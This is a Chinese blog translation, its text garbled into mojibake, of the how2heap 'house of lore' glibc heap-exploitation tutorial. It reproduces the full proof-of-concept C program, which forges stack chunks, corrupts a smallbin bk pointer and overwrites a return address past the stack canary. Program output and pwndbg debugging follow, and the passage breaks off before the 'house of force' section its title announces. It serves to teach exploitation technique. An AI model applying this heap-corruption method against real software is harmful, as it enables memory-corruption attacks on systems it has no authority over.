# how2heapä¹‹house of lore && house of force
|
##### è¯‘æ–‡å£°æ˜Ž
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŽŸæ–‡ä¸ºå‡†ã€‚
> æ¬¢è¿Žå„ä½å–œæ¬¢å®‰å…¨çš„å°ä¼™ä¼´ä»¬åŠ å…¥æ˜Ÿç›Ÿå®‰å…¨ UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> æœ¬æ–‡åŒ…å« house of lore,house of force
PS:ç”±äºŽæœ¬äººæ‰ç–å­¦æµ…,æ–‡ä¸­å¯èƒ½ä¼šæœ‰ä¸€äº›ç†è§£çš„ä¸å¯¹çš„åœ°æ–¹,æ¬¢è¿Žå„ä½æ–§æ­£ ðŸ™‚
## house of lore
###  åº
æˆ‘ä»¬çš„house of loreå…¶å®žå°±æ˜¯åˆ©ç”¨äº†small binçš„æœºåˆ¶è€Œå¯¼è‡´çš„ä»»æ„åœ°å€åˆ†é…,æ‰€åˆ©ç”¨çš„åœ°æ–¹å°±æ˜¯
    [ ... ]
    else
        {
          bck = victim->bk;
        if (__glibc_unlikely (bck->fd != victim)){
                      errstr = "malloc(): smallbin double linked list corrupted";
                      goto errout;
                    }
           set_inuse_bit_at_offset (victim, nb);
           bin->bk = bck;
           bck->fd = bin;
           [ ... ]
æˆ‘ä»¬éœ€è¦åšçš„,å°±æ˜¯å°†small binçš„bkæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬çš„fake
chunk,ä¹Ÿå°±æ˜¯æŽ§åˆ¶bck,ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯bck->fd!=victimè¿™ä¸ªåœ°æ–¹éœ€è¦ç»•è¿‡
å…³äºŽsmall binåœ¨æœ€2.29ä¸­å…¶å®žè¿˜æœ‰ä¸€ç§æ”»å‡»æ–¹æ³•,ä½†æ˜¯è¿™é‡Œå°±ä¸å†è¯¦è¿°äº†
è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹çš„å°±æ˜¯ç¨‹åºæŽ¨èåœ¨ubuntu 14.04 32ä½æœºä¸Šæµ‹è¯•,ä½†æˆ‘æ˜¯åœ¨ubuntu 16.04çš„64ä½æœºä¸Šæµ‹è¯•çš„,æ‰€ä»¥ä¼šæœ‰ä¸€äº›å‡ºå…¥,ä½†å…¶å®žé—®é¢˜ä¸å¤§
###  æºä»£ç 
è¿™é‡Œæˆ‘å°±ä¸åˆ äº†,åªåŠ äº†ä¸€ç‚¹æ³¨é‡Š
    /*
    Advanced exploitation of the House of Lore - Malloc Maleficarum.
    This PoC take care also of the glibc hardening of smallbin corruption.
    [ ... ]
    else
        {
          bck = victim->bk;
        if (__glibc_unlikely (bck->fd != victim)){
                      errstr = "malloc(): smallbin double linked list corrupted";
                      goto errout;
                    }
           set_inuse_bit_at_offset (victim, nb);
           bin->bk = bck;
           bck->fd = bin;
           [ ... ]
    */
    #include 
    #include 
    #include 
    #include 
    void jackpot(){ puts("Nice jump d00d"); exit(0); }
    int main(int argc, char * argv[]){
      intptr_t* stack_buffer_1[4] = {0};
      intptr_t* stack_buffer_2[3] = {0};
      fprintf(stderr, "nWelcome to the House of Loren");
      //è¿™ä¸ªç‰ˆæœ¬ä¹Ÿå¯ä»¥ç»•è¿‡glibc mallocå¼•å…¥çš„å¼ºåŒ–æ£€æŸ¥
      fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc mallocn");                                                                                                        fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23nn");
      //åˆ†é…victim chunk(100)
      fprintf(stderr, "Allocating the victim chunkn");
      intptr_t *victim = malloc(100);
      //è¿™æ—¶å †ä¸Šçš„ç¬¬ä¸€ä¸ªsmall chunk
      fprintf(stderr, "Allocated the first small chunk on the heap at %pn", victim);
      //æˆ‘ä»¬éœ€è¦åŽ»æŽ‰å¤´éƒ¨å¤§å°æ‰èƒ½å¾—åˆ°çœŸæ­£çš„victimåœ°å€
      // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk                                                                                                         intptr_t *victim_chunk = victim-2;
      fprintf(stderr, "stack_buffer_1 at %pn", (void*)stack_buffer_1);
      fprintf(stderr, "stack_buffer_2 at %pn", (void*)stack_buffer_2);
      //åœ¨æ ˆä¸Šåˆ›å»ºä¸€ä¸ªfake chunk
      fprintf(stderr, "Create a fake chunk on the stackn");
      //æˆ‘ä»¬æŠŠfwdæŒ‡é’ˆæŒ‡å‘victim_chunkæ¥ç»•è¿‡ç¬¬äºŒä¸ªmallocåˆ°æœ€åŽä¸€ä¸ªmallocä¸Šsmall bin corruptedçš„æ£€æŸ¥,è¿™æ ·å°±å¯ä»¥å°†æˆ‘ä»¬çš„æ ˆåœ°å€å†™åˆ°small bin listé‡Œäº†
      fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
             "in second to the last malloc, which putting stack address on smallbin listn");
      stack_buffer_1[0] = 0;
      stack_buffer_1[1] = 0;
      stack_buffer_1[2] = victim_chunk;
      //å°†æˆ‘ä»¬çš„bkæŒ‡é’ˆæŒ‡å‘stack_buffer_2å¹¶ä¸”å°†stack_buffer_2çš„fwdæŒ‡é’ˆæŒ‡å‘stack_buffer_1æ¥ç»•è¿‡æœ€åŽä¸€ä¸ªmallocä¸Šsmall bin corruptedçš„æ£€æŸ¥,è¿™æ ·å°±å¯ä»¥åœ¨æ ˆä¸Šè¿”å›žä¸€ä¸ªå‡çš„chunk
      fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buff                                                                                                 er_1 "
             "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "                                                                                                               "chunk on stack");
      stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
      stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
      //åˆ†é…å¦ä¸€ä¸ªlarge binæ¥é¿å…small binåœ¨freeçš„æ—¶å€™ä¸Žtop chunkåˆå¹¶
      fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
             "the small one during the free()n");
      void *p5 = malloc(1000);
      fprintf(stderr, "Allocated the large chunk on the heap at %pn", p5);
      //freeé¡¶å—,æ­¤æ—¶ä¼šå°†å®ƒæ”¾è¿›unsorted binä¸­
      fprintf(stderr, "Freeing ttop he chunk %p, it will be inserted in the unsorted binn", victim);
      free((void*)victim);
      //åœ¨unsorted binä¸­,victimçš„fwdå’ŒbkæŒ‡é’ˆéƒ½æ˜¯0
      fprintf(stderr, "nIn the unsorted bin the victim's fwd and bk pointers are niln");
      fprintf(stderr, "victim->fwd: %pn", (void *)victim[0]);
      fprintf(stderr, "victim->bk: %pnn", (void *)victim[1]);
      //çŽ°åœ¨è°ƒç”¨ä¸€ä¸ªä¸ä¼šè¢«unsorted binæˆ–è€…small binå¤„ç†çš„malloc
      fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small binn");
      //è¿™ä¹Ÿæ„å‘³ç€chunk victimä¼šè¢«æ’å…¥åˆ°smallbinçš„æœ€å‰é¢
      fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBinn", victim);
      void *p2 = malloc(1200);
      fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %pn", p2                                                                                                 );
      //victim chunkå·²ç»è¢«æŽ’åºå¹¶ä¸”ä»–çš„fwdå’ŒbkæŒ‡é’ˆä¹Ÿè¢«æ›´æ–°äº†
      fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updatedn");
      fprintf(stderr, "victim->fwd: %pn", (void *)victim[0]);
      fprintf(stderr, "victim->bk: %pnn", (void *)victim[1]);
      //------------VULNERABILITY-----------      //çŽ°åœ¨å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¼æ´žå¯ä»¥è¦†ç›–victim->bkæŒ‡é’ˆ
      fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointern");
      //victim->bkæ­£æŒ‡å‘æ ˆä¸Š
      victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack 
      //------------------------------------      //çŽ°åœ¨æˆ‘ä»¬åˆ†é…ä¸€ä¸ªå’Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡freeå¤§å°ä¸€æ ·çš„chunk
      fprintf(stderr, "Now allocating a chunk with size equal to the first one freedn");
      //è¿™ä¸ªæ“ä½œå°†ä¼šç»™æˆ‘ä»¬è¿”å›žå·²ç»è¢«è¦†å†™çš„victim chunkå¹¶ä¸”å°†bin->bkæŒ‡å‘è¢«æ³¨å…¥çš„victim->bkæŒ‡é’ˆ
      fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointern");
      void *p3 = malloc(100);
      //è¿™ä¸ªæœ€åŽä¸€æ¬¡çš„mallocå°†æ¬ºéª—glibc mallocè¿”å›žä¸€ä¸ªåœ¨bin->bkä¸­è¢«æ³¨å…¥çš„chunk
      fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bkn");
      char *p4 = malloc(100);
      fprintf(stderr, "p4 = malloc(100)n");
      //è€Œstack_buffer_2çš„fwdæŒ‡é’ˆä¹Ÿåœ¨æœ€åŽä¸€æ¬¡çš„mallocä¸­è¢«ä¿®æ”¹äº†
      fprintf(stderr, "nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %pn",
             stack_buffer_2[2]);
      fprintf(stderr, "np4 is %p and should be on the stack!n", p4); // this chunk will be allocated on stack
      intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
      memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
    }
###  è¿è¡Œç»“æžœ
    Welcome to the House of Lore
    This is a revisited version that bypass also the hardening check introduced by glibc malloc
    This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23
    Allocating the victim chunk
    Allocated the first small chunk on the heap at 0x81c010
    stack_buffer_1 at 0x7ffeea058c50
    stack_buffer_2 at 0x7ffeea058c30
    Create a fake chunk on the stack
    Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
    Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
    Allocated the large chunk on the heap at 0x81c080
    Freeing the chunk 0x81c010, it will be inserted in the unsorted bin
    In the unsorted bin the victim's fwd and bk pointers are nil
    victim->fwd: (nil)
    victim->bk: (nil)
    Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
    This means that the chunk 0x81c010 will be inserted in front of the SmallBin
    The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x81c470
    The victim chunk has been sorted and its fwd and bk pointers updated
    victim->fwd: 0x7f5b68740bd8
    victim->bk: 0x7f5b68740bd8
    Now emulating a vulnerability that can overwrite the victim->bk pointer
    Now allocating a chunk with size equal to the first one freed
    This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
    This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
    p4 = malloc(100)
    The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7f5b68740bd8
    p4 is 0x7ffeea058c60 and should be on the stack!
    Nice jump d00d
###  å…³é”®ä»£ç è°ƒè¯•
æ–­ç‚¹å¦‚ä¸‹:
       42   intptr_t *victim = malloc(100);
     â–º 43   fprintf(stderr, "Allocated the first small chunk on the heap at %pn", victim);
       54   stack_buffer_1[0] = 0;
       55   stack_buffer_1[1] = 0;
       56   stack_buffer_1[2] = victim_chunk;
       57
     â–º 58   fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
       61   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
       62   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
       63
     â–º 64   fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
       66   void *p5 = malloc(1000);
     â–º 67   fprintf(stderr, "Allocated the large chunk on the heap at %pn", p5);
       71   free((void*)victim);
       72
     â–º 73   fprintf(stderr, "nIn the unsorted bin the victim's fwd and bk pointers are niln");
       80   void *p2 = malloc(1200);
     â–º 81   fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %pn", p2);
        91   victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
        92
        93   //------------------------------------        94
     â–º  95   fprintf(stderr, "Now allocating a chunk with size equal to the first one freedn");
        98   void *p3 = malloc(100);
        99
       100
     â–º 101   fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bkn");
        102   char *p4 = malloc(100);
     â–º 103   fprintf(stderr, "p4 = malloc(100)n");
       109   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
       110   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
     â–º 111 }
ä¸‹é¢ç›´æŽ¥è¿è¡Œ,é¦–å…ˆæ˜¯malloc äº†victim
    pwndbg> heap
    0x603000 FASTBIN {
      prev_size = 0,
      size = 113,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603070 PREV_INUSE {
      prev_size = 0,
      size = 135057,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> p stack_buffer_1
    $1 = {0x0, 0x0, 0x0, 0x0}
    pwndbg> p stack_buffer_2
    $2 = {0x0, 0x0, 0x0}
    pwndbg> p &stack_buffer_1
    $3 = (intptr_t *(*)[4]) 0x7fffffffe620
    pwndbg> p &stack_buffer_2
    $4 = (intptr_t *(*)[3]) 0x7fffffffe600
ç„¶åŽç¨‹åºä¿®æ”¹äº†stack_buffer_1çš„å€¼
    pwndbg> p stack_buffer_1
    $5 = {0x0, 0x0, 0x603000, 0x0}
    //æˆ‘ä»¬æ‰€ä¼ªé€ çš„stack_buffer_1
    $6 = {
      prev_size = 0,
      size = 0,
      fd = 0x603000,
      bk = 0x0,